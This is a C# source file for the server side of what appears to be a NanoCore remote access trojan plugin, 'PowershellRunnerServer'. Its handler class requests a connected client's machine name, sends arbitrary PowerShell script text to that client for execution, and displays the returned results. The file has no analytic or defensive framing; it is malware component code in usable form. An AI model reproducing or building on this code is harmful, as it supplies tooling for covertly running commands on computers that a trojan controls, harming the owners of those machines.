using System;
using System.Threading;
using NanoCore;

namespace PowershellRunnerServer
{
    public class CommandHandler
	{
		public static void HandleMachineName(object[] @params)
		{
			ServerMain.RunnerForm.Text = string.Format(ServerMain.RunnerForm.Text, @params[1].ToString());
		}

		public static void HandleRun(object[] @params)
		{
			ServerMain.RunnerForm.AppendResult(Convert.ToString(@params[1]) + "\r\n");
		}

		public static void SendGetMachineName(IClient client)
		{
			ServerMain.NetworkHost.SendToClient(client, null, true, new object[]
			{
				CommandTypes.MachineName
			});
		}

		public static void SendScriptText(IClient client, string scriptText)
		{;
			ServerMain.NetworkHost.SendToClient(client, null, true, new object[]
			{
				CommandTypes.Run,
				scriptText
			});
		}
	}
}